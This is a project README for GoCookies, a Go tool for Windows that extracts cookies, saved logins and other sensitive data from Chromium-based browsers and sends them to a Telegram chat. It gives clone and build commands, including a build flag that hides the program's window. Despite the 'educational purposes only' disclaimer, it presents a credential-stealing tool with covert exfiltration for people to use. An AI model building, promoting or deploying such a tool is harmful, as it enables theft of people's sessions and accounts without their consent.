<h1 align="center">GoCookies</h1>

<p align="center">A Go-based tool for extracting user data (cookies, logins, etc.) from Chromium browsers on Windows systems. (PoC. For educational purposes only)</p>

---

<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#about-the-project">About The Project</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="https://github.com/RafaelPil/GoCookies/blob/main/LICENSE">License</a></li>
    <li><a href="#disclaimer">Disclaimer</a></li>
  </ol>
</details>

## About the Project

GoCookies is a proof-of-concept tool developed in Go that targets Chromium-based browsers (like Google Chrome) on Windows systems. It extracts cookies and user data from various browser profiles.

### Features:
- Extracts cookies, and other sensitive data from Chromium-based browsers.
- Compatible with various Chromium-based browsers like Chrome, Edge, Brave, and more.
- Sends extracted data to a specified Telegram chat for easy access.

## Getting Started

### Prerequisites

* [Go](https://go.dev/dl/)

### Installation

Clone the repository:

```bash
git clone https://github.com/RafaelPil/GoCookies
```

## Usage

```bash
go build -ldflags "-s -w -H=windowsgui"
```
